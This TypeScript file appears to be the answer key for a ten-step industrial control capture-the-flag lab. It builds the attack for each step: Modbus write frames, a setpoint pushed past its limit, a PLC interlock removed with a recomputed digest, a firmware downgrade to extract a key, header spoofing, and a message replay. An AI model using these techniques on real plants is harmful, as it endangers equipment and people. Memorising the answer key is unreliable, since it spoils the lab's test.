import assert from "node:assert/strict";
import { createHash, createHmac } from "node:crypto";
import { gunzipSync } from "node:zlib";

export const otJsonCommand = (op: string, value: unknown) =>
  `ot ${op} '${JSON.stringify(value)}'`;
function frame(fn: number, address: number, value: number) {
  const bytes = Buffer.alloc(12);
  bytes.writeUInt16BE(1, 0);
  bytes.writeUInt16BE(6, 4);
  bytes[6] = 1;
  bytes[7] = fn;
  bytes.writeUInt16BE(address, 8);
  bytes.writeUInt16BE(value, 10);
  return "ot modbus " + bytes.toString("hex");
}
export async function prepareOtCommands(
  read: (n: number, name: string) => Promise<string>,
) {
  const commands: Record<string, string[]> = {};
  const coils = (await read(1, "mapa.csv")).trim().split("\n");
  const blue = Number(
    coils.find((row) => row.endsWith(",indicacion_azul"))!.split(",")[0],
  );
  commands["ot-01"] = [frame(5, blue, 0xff00)];
  const delivery = await read(2, "entrega.txt"),
    serial = delivery.match(/Serie (\S+)/)![1],
    user = delivery.match(/Cuenta inicial (\w+)/)![1];
  commands["ot-02"] = [`ot login ${user} Axon!${serial.slice(-4)}`];
  commands["ot-03"] = [
    "ot http GET " +
      (await read(3, "hmi-access.log")).match(/GET (\S+\.cfg)/)![1],
  ];
  const reserved = (await read(4, "memoria.csv"))
    .trim()
    .split("\n")
    .find((row) => row.endsWith(",registro_reservado"))!
    .split(",");
  commands["ot-04"] = [frame(3, Number(reserved[0]), Number(reserved[1]))];
  const tune = JSON.parse(await read(5, "peticion.json"));
  tune.role = (await read(5, "permisos.csv"))
    .trim()
    .split("\n")
    .find((row) => row.endsWith(",si,si"))!
    .split(",")[0];
  commands["ot-05"] = [otJsonCommand("hmi", tune)];
  const config = Object.fromEntries(
    (await read(6, "proxy.conf"))
      .trim()
      .split("\n")
      .map((row) => row.split("=")),
  );
  commands["ot-06"] = [
    "ot http GET /engineering/diagnostics '" +
      JSON.stringify({ [config.origin_header]: config.engineering_network }) +
      "'",
  ];
  const limits = (await read(7, "parametros.csv"))
    .trim()
    .split("\n")[1]
    .split(",");
  commands["ot-07"] = [frame(6, Number(limits[0]), Number(limits[3]) + 300)];
  const transfer = JSON.parse(await read(8, "transferencia.json"));
  transfer.source = transfer.source
    .split("\n")
    .filter((line: string) => line !== "AND NOT MAINTENANCE")
    .join("\n");
  transfer.digest = createHash("sha256").update(transfer.source).digest("hex");
  commands["ot-08"] = [otJsonCommand("program", transfer)];
  const repository = JSON.parse(await read(9, "repositorio.json")) as {
    release: string;
    bundle: string;
  }[];
  const packages = repository.map((entry) =>
    JSON.parse(
      gunzipSync(Buffer.from(entry.bundle, "base64")).toString("utf8"),
    ),
  );
  const old = packages.find(
    (pack) => pack.image.securityVersion < 7 && pack.image.legacyDiagnostic,
  )!;
  assert.ok(old);
  const legacyKey = Buffer.from(old.image.payloadHex, "hex")
    .toString("utf8")
    .match(/UART_DIAG_KEY=([a-f0-9]+)/)![1];
  commands["ot-09"] = [
    otJsonCommand("firmware", old),
    "ot diagnostic challenge",
  ];
  const endpoint = JSON.parse(await read(10, "receptor.json"));
  assert.equal(endpoint.maintenanceWindow, "closed");
  const stream = (await read(10, "flujos.csv"))
    .trim()
    .split("\n")
    .find((row) => row.endsWith(",10.77.0.70:8443"))!
    .split(",")[0];
  const chunks = (await read(10, "capturas.csv"))
    .trim()
    .split("\n")
    .slice(1)
    .map((row) => row.split(","))
    .filter((row) => row[0] === stream && row[1] === "c2s")
    .sort((a, b) => Number(a[2]) - Number(b[2]));
  const unique = new Map<number, Buffer>();
  for (const row of chunks) {
    const seq = Number(row[2]),
      bytes = Buffer.from(row[3], "hex");
    if (unique.has(seq)) assert.deepEqual(unique.get(seq), bytes);
    else unique.set(seq, bytes);
  }
  let expected = Number(chunks[0][2]);
  for (const [seq, bytes] of unique) {
    assert.equal(seq, expected);
    expected += bytes.length;
  }
  const captured = JSON.parse(
    Buffer.concat([...unique.values()]).toString("utf8"),
  );
  assert.equal(captured.body.controller, endpoint.controller);
  assert.ok(captured.body.counter < endpoint.acceptedCounter);
  assert.ok(Date.parse(captured.body.expires) < Date.parse(endpoint.clock));
  commands["ot-10"] = [otJsonCommand("replay", captured)];
  return {
    commands,
    legacyKey,
    modern: packages.find((pack) => !pack.image.legacyDiagnostic),
    captured,
    baseProgram: JSON.parse(await read(8, "transferencia.json")),
  };
}
export function legacyProof(key: string, output: string) {
  const challenge = output.match(/Desafío ASCII: (\S+)/)![1];
  return (
    "ot diagnostic read-custody " +
    createHmac("sha256", Buffer.from(key, "hex"))
      .update(challenge)
      .digest("hex")
  );
}
export function otReplyFlag(id: string, output: string) {
  let text = output;
  if (id === "ot-04") {
    const bytes = Buffer.from(output.match(/RX ([a-f0-9]+)/)![1], "hex");
    assert.equal(bytes[7], 3);
    assert.equal(bytes[8], bytes.length - 9);
    text = bytes.subarray(9).toString("utf8").replace(/\0+$/, "");
  }
  const flag = text.match(/CTF\{[a-f0-9]{32}\}/)?.[0];
  assert.ok(flag, "Falta evidencia de " + id);
  return flag;
}
